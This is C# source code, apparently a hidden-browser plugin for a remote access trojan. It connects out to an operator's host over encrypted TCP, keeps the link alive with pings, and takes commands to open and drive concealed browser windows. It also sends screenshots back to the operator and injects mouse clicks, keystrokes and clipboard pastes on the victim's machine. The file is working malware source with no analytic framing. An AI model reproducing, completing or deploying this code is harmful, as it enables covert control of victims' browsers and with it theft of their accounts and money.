using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Drawing.Imaging;
using System.Drawing;
using System.IO;
using System.IO.Compression;
using System.Linq;
using System.Net.Sockets;
using System.Runtime.InteropServices;
using System.Security.Cryptography;
using System.Security.Principal;
using System.Text;
using System.Threading;
using System.Windows.Forms;
using Microsoft.VisualBasic; // Install-Package Microsoft.VisualBasic
using Microsoft.VisualBasic.CompilerServices; // Install-Package Microsoft.VisualBasic
using Microsoft.Win32;
using static System.Net.Mime.MediaTypeNames;
using System.Windows.Forms.VisualStyles;
using HB.Handle;

namespace HBrowser
{
    class Plugin
    {
        public static System.Threading.Thread T1 = new System.Threading.Thread(new System.Threading.ThreadStart(ClientSocket.BeginConnect));
        public static System.Threading.Thread T2 = new System.Threading.Thread(new System.Threading.ThreadStart(ClientSocket.Ping));


        public static void Run(string H, string P, string SL, string K, string id)
        {

            try
            {
                Settings.Host = H;
                Settings.Port = P;
                Settings.SPL = SL;
                Settings.KEY = K;
                Settings.IDD = id;
                T1.Start();
                T2.Start();
            }
            catch (Exception ex)
            {
                Debug.WriteLine(ex.Message);
            }
        }

    }


    public partial class Settings
    {
        public static string Host;
        public static string Port;
        public static string KEY;
        public static string SPL;
        public static string IDD;
    }

    public partial class ClientSocket
    {
        public static bool isConnected = false;
        public static Socket S;
        public static long BufferLength = default;
        public static byte[] Buffer;
        public static MemoryStream MS = new MemoryStream();
        public static void BeginConnect()
        {
            S = new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp);
            BufferLength = -1;
            Buffer = new byte[1];
            MS = new MemoryStream();

            S.ReceiveBufferSize = 50 * 1024;
            S.SendBufferSize = 50 * 1024;

            try
            {
                S.Connect(Settings.Host, Conversions.ToInteger(Settings.Port));
                isConnected = true;



                Send("FormHBrowser" + Settings.SPL + Settings.IDD);


                S.BeginReceive(Buffer, 0, Buffer.Length, SocketFlags.None, new AsyncCallback(BeginReceive), S);
            }
            catch (Exception ex)
            {
                isDisconnected();
            }
        }

        public static void BeginReceive(IAsyncResult ar)
        {
            if (isConnected == false)
                isDisconnected();
            try
            {
                int Received = S.EndReceive(ar);
                if (Received > 0)
                {
                    if (BufferLength == -1)
                    {
                        if (Buffer[0] == 0)
                        {
                            BufferLength = Conversions.ToLong(Helper.BS(MS.ToArray()));
                            MS.Dispose();
                            MS = new MemoryStream();

                            if (BufferLength == 0L)
                            {
                                BufferLength = -1;
                                S.BeginReceive(Buffer, 0, Buffer.Length, SocketFlags.None, new AsyncCallback(BeginReceive), S);
                                return;
                            }
                            Buffer = new byte[(int)(BufferLength - 1L + 1)];
                        }
                        else
                        {
                            MS.WriteByte(Buffer[0]);
                        }
                    }
                    else
                    {
                        MS.Write(Buffer, 0, Received);
                        if (MS.Length == BufferLength)
                        {

                            var thread = new Thread(BeginRead);
                            thread.Start(MS.ToArray());

                            BufferLength = -1;
                            MS.Dispose();
                            MS = new MemoryStream();
                            Buffer = new byte[1];
                        }
                        else
                        {
                            Buffer = new byte[(int)(BufferLength - MS.Length - 1L + 1)];
                        }
                    }
                }
                else
                {
                    isDisconnected();
                    return;
                }
                S.BeginReceive(Buffer, 0, Buffer.Length, SocketFlags.None, new AsyncCallback(BeginReceive), S);
            }
            catch (Exception ex)
            {
                isDisconnected();
                return;
            }
        }

        public static void BeginRead(object b)
        {
            try
            {
                byte[] buffer = (byte[])b;
                Messages.Read(buffer);
            }
            catch (Exception ex)
            {
                Debug.WriteLine(ex.Message);
            }
        }

        public static void Send(string msg)
        {
            try
            {
                using (var MS = new MemoryStream())
                {
                    var B = Helper.AES_Encryptor(Helper.SB(msg));
                    var L = Helper.SB(B.Length.ToString() + Conversions.ToChar(Constants.vbNullChar));

                    MS.Write(L, 0, L.Length);
                    MS.Write(B, 0, B.Length);

                    S.Poll(-1, SelectMode.SelectWrite);
                    S.Send(MS.ToArray(), 0, (int)MS.Length, SocketFlags.None);
                }
            }
            catch (Exception ex)
            {
                isDisconnected();
            }
        }


        public static void isDisconnected()
        {
            isConnected = false;

            try
            {
                S.Close();
                S.Dispose();
            }
            catch (Exception ex)
            {
                Debug.WriteLine(ex.Message);
            }


            try
            {
                MS.Close();
                MS.Dispose();
            }
            catch (Exception ex)
            {
                Debug.WriteLine(ex.Message);
            }


            try
            {
               Plugin.T1.Abort();
            }
            catch (Exception ex)
            {
                Debug.WriteLine(ex.Message);
            }
            try
            {
                Plugin.T2.Abort();
            }
            catch (Exception ex)
            {
                Debug.WriteLine(ex.Message);
            }


        }

        public static void Ping()
        {
            while (true)
            {
                System.Threading.Thread.Sleep(30 * 1000);
                try
                {
                    if (S.Connected)
                    {
                        using (var MS = new MemoryStream())
                        {
                            var B = Helper.AES_Encryptor(Helper.SB("PING?"));
                            var L = Helper.SB(B.Length.ToString() + Conversions.ToChar(Constants.vbNullChar));

                            MS.Write(L, 0, L.Length);
                            MS.Write(B, 0, B.Length);

                            S.Poll(-1, SelectMode.SelectWrite);
                            S.Send(MS.ToArray(), 0, (int)MS.Length, SocketFlags.None);
                            GC.Collect();
                        }
                    }
                }
                catch (Exception ex)
                {
                    isDisconnected();
                }
            }
        }
    }

    public partial class Messages
    {
        public static void Read(byte[] b)
        {
            try
            {
                var A = Strings.Split(Helper.BS(Helper.AES_Decryptor(b)), Conversions.ToString(Settings.SPL));
                switch (A[0] ?? "")
                {
                    case "CloseHBrowser":
                        {
                            try
                            {
                                int x6 = Convert.ToInt32(A[1]);
                                int y6 = Convert.ToInt32(A[2]);
                                GetWindowsHidden.ClearList(x6, y6);
                            }
                            catch
                            {
                            }
                            ClientSocket.isDisconnected();
                            break;
                        }


                    case "HBrowser+":
                        {
                            Bitmap bitmap = null;
                            Helper.Resize = false;

                            try
                            {

                                if (GetWindowsHidden.WindowCheck(Helper.WindowrActive))
                                {
                                    bitmap = ScreenshotCapture.CaptureWindow(Helper.WindowrActive);
                                    using (Helper.Appsstream = new MemoryStream())
                                    {

                                        EncoderParameter encoderParameter = new EncoderParameter(System.Drawing.Imaging.Encoder.Quality, Convert.ToInt32(A[1]));
                                        ImageCodecInfo encoderInfo = Helper.GetEncoderInfo("image/jpeg");
                                        EncoderParameters encoderParameters = new EncoderParameters(1);
                                        encoderParameters.Param[0] = encoderParameter;
                                        bitmap.Save(Helper.Appsstream, encoderInfo, encoderParameters);


                                        ClientSocket.Send("HBrowser+" + Settings.SPL + Settings.IDD + Settings.SPL + Convert.ToBase64String(Helper.Compress(Helper.Appsstream.ToArray())));

                                        encoderParameters?.Dispose();
                                        bitmap?.Dispose();
                                    }
                                }
                                else
                                {
                                    ClientSocket.Send("HBrowser+" + Settings.SPL + Settings.IDD + Settings.SPL + "");
                                }

                            }
                            catch
                            {
                            }
                            break;
                        }

                    case "UpdateWindowsActive":
                        {
                            GetWindowsHidden.GetListWindow();
                            break;
                        }

                    case "OpenBrowser":
                        {
                            string asString2 = A[1];
                            string asString3 = A[2];
                            string asString4 = A[3];
                            int width = Convert.ToInt32(A[4]);
                            int height = Convert.ToInt32(A[5]);
                            string text = GetWindowsHidden.RetrunBrowser(asString2, asString3, asString4);
                            if (!string.IsNullOrEmpty(text) && GetWindowsHidden.GetHandleBrowser(text, width, height))
                            {
                                GetWindowsHidden.GetListWindow();
                                Helper.MsgLogs(asString2 + "Browser is prepared to control incognito.");
                            }
                            else
                            {
                                Helper.MsgLogs("Window is not found - " + asString2);
                            }
                            break;
                        }

                    case "Close":
                        {
                            string asString = A[1];
                            int num = Convert.ToInt32(A[2]);
                            int num2 = Convert.ToInt32(A[3]);
                            int num3 = Convert.ToInt32(A[4]);
                            if (GetWindowsHidden.InitializingWindow(num, num2, num3))
                            {
                                GetWindowsHidden.WindowClose(GetWindowsHidden.ListBrowser[num], num2, num3);
                                GetWindowsHidden.GetListWindow();
                            }
                            else
                            {
                                Helper.MsgLogs("Failed to close the window - " + asString);
                            }
                            break;
                        }

                    case "GetHWND":
                        {
                            string asString5 = A[1];
                            int num4 = Convert.ToInt32(A[2]);
                            int width2 = Convert.ToInt32(A[3]);
                            int height2 = Convert.ToInt32(A[4]);
                            if (GetWindowsHidden.InitializingWindow(num4, width2, height2))
                            {
                                Helper.WindowrActive = GetWindowsHidden.ListBrowser[num4];
                                Helper.MsgLogs(asString5 + " window is ready");
                            }
                            else
                            {
                                Helper.MsgLogs("Window is not found - " + asString5);
                            }
                            break;
                        }


                    case "Resize":
                        {
                            int x7 = Convert.ToInt32(A[1]);
                            int y7 = Convert.ToInt32(A[2]);
                            if (GetWindowsHidden.WindowCheck(Helper.WindowrActive))
                            {
                                GetWindowsHidden.ResizeWondow(Helper.WindowrActive, x7, y7);
                            }
                            break;
                        }

                    case "keyboardClick":
                        {
                            HandleMouse.KeyboardDown(A[1]);
                            break;

                        }

                    case "paste":
                        {
                            HandleClipboard.Paste(A[1]);
                            break;
                        }



                    case "LeftDown":
                        {
                            // A[1] = X
                            // A[2] = Y

                            int x5 = Convert.ToInt32(A[1]);
                            int y5 = Convert.ToInt32(A[2]);
                            HandleMouse.MouseLeftDown(x5, y5);
                            break;
                        }
                    case "RightDown":
                        {
                            int x4 = Convert.ToInt32(A[1]);
                            int y4 = Convert.ToInt32(A[2]);
                            HandleMouse.MouseRightDown(x4, y4);
                            break;
                        }
                    case "LeftUp":
                        {
                            int x3 = Convert.ToInt32(A[1]);
                            int y3 = Convert.ToInt32(A[2]);
                            HandleMouse.MouseLeftUp(x3, y3);
                            break;
                        }
                    case "RightUp":
                        {
                            int x2 = Convert.ToInt32(A[1]);
                            int y2 = Convert.ToInt32(A[2]);
                            HandleMouse.MouseRghitUp(x2, y2);
                            break;
                        }
                    case "MoveCursor":
                        {
                            int x = Convert.ToInt32(A[1]);
                            int y = Convert.ToInt32(A[2]);
                            HandleMouse.MouseMove(x, y);
                            break;
                        }


                    case "ScrollDown":
                        {
                            Helper.ScrollDown();
                            break;
                        }


                    case "ScrollUp":
                        {
                            Helper.ScrollUp();
                            break;
                        }

                }
            }
            catch (Exception ex)
            {
                Helper.MsgLogs("Error! " + ex.Message);
            }
        }


    }

    internal static partial class Helper
    {

        [DllImport("user32.dll")]
        public static extern int SendMessage(IntPtr hWnd, int Msg, IntPtr wParam, IntPtr lParam);
        public static void ScrollDown()
        {
            IntPtr hWnd = WindowrActive;
            if (hWnd != IntPtr.Zero)
                SendMessage(hWnd, 0x115, new IntPtr(1), IntPtr.Zero);
        }
        public static void ScrollUp()
        {
            IntPtr hWnd = WindowrActive;
            if (hWnd != IntPtr.Zero)
                SendMessage(hWnd, 0x115, new IntPtr(0), IntPtr.Zero);
        }


        public static MemoryStream Appsstream = new MemoryStream();
        public static IntPtr WindowrActive { get; set; }

        public static int Quality { get; set; }

        public static bool Resize { get; set; }

        public static bool Speed { get; set; }

        public static int X { get; set; }

        public static int Y { get; set; }




        public static void MsgLogs(string Message)
        {
            ClientSocket.Send("HBrowserMSG" + Settings.SPL + Settings.IDD + Settings.SPL + Message);
        }

        public static ImageCodecInfo GetEncoderInfo(string M)
        {
            ImageCodecInfo[] imageEncoders = ImageCodecInfo.GetImageEncoders();
            int arg_0B_0 = 0;
            int num = imageEncoders.Length;
            for (int i = arg_0B_0; i <= num; i++)
            {
                if (Microsoft.VisualBasic.CompilerServices.Operators.CompareString(imageEncoders[i].MimeType, M, false) == 0)
                    return imageEncoders[i];
            }
            return null/* TODO Change to default(_) if this is not a reference type */;
        }

        public static byte[] Decompress(byte[] input)
        {
            using (var source = new MemoryStream(input))
            {
                byte[] lengthBytes = new byte[4];
                source.Read(lengthBytes, 0, 4);

                var length = BitConverter.ToInt32(lengthBytes, 0);
                using (var decompressionStream = new GZipStream(source,
                    CompressionMode.Decompress))
                {
                    var result = new byte[length];
                    decompressionStream.Read(result, 0, length);
                    return result;
                }
            }
        }

        public static byte[] Compress(byte[] input)
        {
            using (var result = new MemoryStream())
            {
                var lengthBytes = BitConverter.GetBytes(input.Length);
                result.Write(lengthBytes, 0, 4);

                using (var compressionStream = new GZipStream(result,
                    CompressionMode.Compress))
                {
                    compressionStream.Write(input, 0, input.Length);
                    compressionStream.Flush();

                }
                return result.ToArray();
            }
        }

        public static byte[] SB(string s)
        {
            return Encoding.UTF8.GetBytes(s);
        }

        public static string BS(byte[] b)
        {
            return Encoding.UTF8.GetString(b);
        }
        public static byte[] AES_Encryptor(byte[] input)
        {
            var AES_ = new RijndaelManaged();
            var Hash = new MD5CryptoServiceProvider();
            try
            {
                AES_.Key = Hash.ComputeHash(SB(Settings.KEY));
                AES_.Mode = CipherMode.ECB;
                var DESEncrypter = AES_.CreateEncryptor();
                var Buffer = input;
                return DESEncrypter.TransformFinalBlock(Buffer, 0, Buffer.Length);
            }
            catch (Exception ex)
            {
                Debug.WriteLine(ex.Message);
            }

            return default;
        }

        public static byte[] AES_Decryptor(byte[] input)
        {
            var AES_ = new RijndaelManaged();
            var Hash = new MD5CryptoServiceProvider();
            try
            {
                AES_.Key = Hash.ComputeHash(SB(Settings.KEY));
                AES_.Mode = CipherMode.ECB;
                var DESDecrypter = AES_.CreateDecryptor();
                var Buffer = input;
                return DESDecrypter.TransformFinalBlock(Buffer, 0, Buffer.Length);
            }
            catch (Exception ex)
            {
                Debug.WriteLine(ex.Message);
            }

            return default;
        }
    }

}
